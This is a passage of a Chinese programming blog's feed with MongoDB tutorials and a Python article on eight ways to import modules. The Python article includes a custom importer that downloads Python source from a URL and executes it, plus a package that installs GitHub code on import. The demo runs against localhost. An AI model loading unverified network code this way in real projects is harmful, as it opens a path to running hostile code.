class="line">db.class1.update(&#123;name:&#39;Lucy&#39;&#125;,&#123;$pull:&#123;score:10&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pullAll</strong></p><ul><li>从数组中删除多个元素  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&#39;Abby&#39;&#125;,&#123;$pullAll:&#123;score:[10,20]&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pop</strong></p><ul><li>弹出数组中的一项</li><li>1表示弹出最后一项,-1表示田川数组中的第一项,多用于弹栈  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.弹出score数组中的最后一项</span><br><span class="line">db.class1.update(&#123;name:&#39;Abby&#39;&#125;,&#123;$pop:&#123;score:1&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>addToSet</strong></p><ul><li>向数组中插入一个元素,但是该元素不能和其他元素重复  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.如果已经存在66则无法插入,如果不存在则插入66</span><br><span class="line">db.class1.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$addToSet:&#123;score:66&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据类型补充"><a href="#数据类型补充" class="headerlink" title="数据类型补充"></a><strong>数据类型补充</strong></h4><ul><li><p><strong>时间类型</strong>:</p><ul><li>mongo中存储时间的格式: ISODate</li></ul></li><li><p>方法1: 自动生成当前时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python&#39;,date:new Date()&#125;)</span><br></pre></td></tr></table></figure></li><li><p>方法2: 生成当前时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python AI&#39;,date:ISODate()&#125;)</span><br></pre></td></tr></table></figure></li><li><p>方法3: 将生成时间变为字符串存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python spyder&#39;,date:Date()&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>指定时间的转换</strong>    </p><ul><li>ISODate()</li><li>功能: 生成mongo时间类型</li><li>参数: 如果不加参数则生成当前时间<ul><li>参数格式</li><li>“2018-11-11 11:11:11”</li><li>“20180101 11:11:11”</li><li>“20181102”<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python web&#39;,date:ISODate(20181111 11:11:11)&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>时间戳</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python web&#39;,date:ISODate().valueOf()&#125;)</span><br></pre></td></tr></table></figure></p><ul><li><p><strong>null</strong></p><ul><li>如果某个域存在却没有值可以设置为null<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.insert(&#123;title:&#39;python book&#39;,price:null&#125;)</span><br></pre></td></tr></table></figure></li><li>表示某个域不存在可以通过null进行匹配<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.可以查找到date不存在的文档</span><br><span class="line">db.class2.find(&#123;date:null&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Object类型</strong> </p><ul><li>域的值是一个文档</li><li>当使用外层文档引用内部文档的时候可以用 . 的方法引用,在使用时需要加上引号<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.查找内部文档</span><br><span class="line">db.class2.find(&#123;&#39;publication.publisher&#39;:&#39;python study&#39;&#125;,&#123;_id:0&#125;)</span><br><span class="line"></span><br><span class="line">e.g.修改内部文档</span><br><span class="line">db.class2.find(&#123;title:&#39;python data&#39;&#125;,&#123;$set:&#123;&#39;publication.price&#39;:66.6&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="数组的下标引用"><a href="#数组的下标引用" class="headerlink" title="数组的下标引用"></a><strong>数组的下标引用</strong></h4><ul><li>使用一个数组时,可以使用 <strong>.序列下标</strong> 的方式使用数组具体的某一项,同样需要引号  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$set:&#123;&#39;score.0&#39;:60&#125;&#125;)</span><br><span class="line">db.class1.find(&#123;&#39;score.0&#39;:&#123;$gt:90&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="文档查找结果的有序性"><a href="#文档查找结果的有序性" class="headerlink" title="文档查找结果的有序性"></a><strong>文档查找结果的有序性</strong></h4><ul><li>可以通过 <code>[]</code> 取查找结果序列的某一项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;)[0]</span><br><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;)[3]</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MySQL和MongoDB修改数据语句对比&quot;&gt;&lt;a href=&quot;#MySQL和MongoDB修改数据语句对比&quot; class=&quot;headerlink&quot; title=&quot;MySQL和MongoDB修改数据语句对比&quot;&gt;&lt;/a&gt;&lt;strong&gt;MySQL和MongoDB修改
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
      <category term="数组" scheme="http://c.cat.plus/tags/%E6%95%B0%E7%BB%84/"/>
    
      <category term="序列" scheme="http://c.cat.plus/tags/%E5%BA%8F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>Python花式导包的几种方法</title>
    <link href="http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2018-03-14T17:01:00.000Z</published>
    <updated>2020-07-21T11:07:24.538Z</updated>
    
    <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天跟大家分享 8 种导入模块的方法。&lt;/p&gt;
&lt;p&gt;直接 import&lt;br&gt;人尽皆知的方法，直接导入即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="import" scheme="http://c.cat.plus/tags/import/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB删除数据</title>
    <link href="http://c.cat.plus/2018/03/14/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/"/>
    <id>http://c.cat.plus/2018/03/14/MongoDB/MongoDB%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</id>
    <published>2018-03-14T10:11:18.000Z</published>
    <updated>2020-07-19T13:03:08.279Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MySQL和MongoDB对比删除操作"><a href="#MySQL和MongoDB对比删除操作" class="headerlink" title="MySQL和MongoDB对比删除操作"></a><strong>MySQL和MongoDB对比删除操作</strong></h4><ul><li><strong>MySQL</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from tableName where ...</span><br></pre></td></tr></table></figure></li><li><strong>MongoDB</strong>:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.remove(query,justOne)</span><br></pre></td></tr></table></figure></li><li>功能: 删除指定的文档</li><li>参数:<ul><li>query: 筛选要删除的文档,类似where子句,同法同查找操作</li><li>justOne: 布尔值 , 默认为 false 表示删除所有筛选数据,如果赋值为true 则表示只删除第一条符合的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.删除age域不存在 或者 age域大于100的文档</span><br><span class="line">db.class0.remove(&#123;$or:[&#123;age:&#123;$exists:false&#125;&#125;,&#123;age:&#123;$gt:100&#125;&#125;]&#125;)</span><br><span class="line"></span><br><span class="line">e.g.删除第一个符合条件的文档</span><br><span class="line">db.class0.remove(&#123;sex:&#123;exists:false&#125;&#125;,true)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>删除集合中所有文档</strong></p><pre><code>db.collectionName.remove({})e.g.db.class1.remove({})</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MySQL和MongoDB对比删除操作&quot;&gt;&lt;a href=&quot;#MySQL和MongoDB对比删除操作&quot; class=&quot;headerlink&quot; title=&quot;MySQL和MongoDB对比删除操作&quot;&gt;&lt;/a&gt;&lt;strong&gt;MySQL和MongoDB对比删除操作&lt;/
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB查询数据</title>
    <link href="http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/"/>
    <id>http://c.cat.plus/2018/03/13/MongoDB/MongoDB%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</id>
    <published>2018-03-13T10:16:08.000Z</published>
    <updated>2020-07-19T13:02:49.479Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MySQL和MongoDB查找操作对比"><a href="#MySQL和MongoDB查找操作对比" class="headerlink" title="MySQL和MongoDB查找操作对比"></a><strong>MySQL和MongoDB查找操作对比</strong></h4><pre><code>mysql:select ... from tableName where ...db.collectionName.find()    同mysql-&gt; select * from tableName</code></pre><h4 id="find-query-field-查找函数"><a href="#find-query-field-查找函数" class="headerlink" title="find(query,field)查找函数"></a><strong>find(query,field)</strong>查找函数</h4><ul><li>功能: 查找所有复合条件的文档</li><li>参数:<ul><li>query:    筛选条件 相当于where子句</li><li>field:    展示的域 相当于select的展示部分</li></ul></li><li>返回: 返回所有查找到的内容</li></ul><p><strong>field 参数</strong>: 选择要展示的域 传一组键值对</p><ul><li><p>键表示域名</p></li><li><p>值表示是否显示该域 0 表示不显示 1 表示显示</p></li><li><p>如果某个域给定0 则表示不显示该域,其他的域均显示</p></li><li><p>如果某个域给定1 则表示显示该域,其他的域都不显示</p></li><li><p><code>_id</code> 永远默认为显示,除非设置为0</p></li><li><p>除_id外其他域必须拥有相同的设置,全为0或者全为1</p></li><li><p>如果不写该参数则表示显示所有域内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1&#125;)</span><br><span class="line">db.class0.find(&#123;&#125;,&#123;_id:0,name:1,age:1&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>query参数</strong>: 以键值对的形式给出查找条件</p><ul><li>查找年龄 17<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li><li>如果不写第一个参数则表示查找所有内容</li></ul><h5 id="findOne"><a href="#findOne" class="headerlink" title="findOne()"></a><strong>findOne()</strong></h5><ul><li>功能参数和 <code>find()</code> 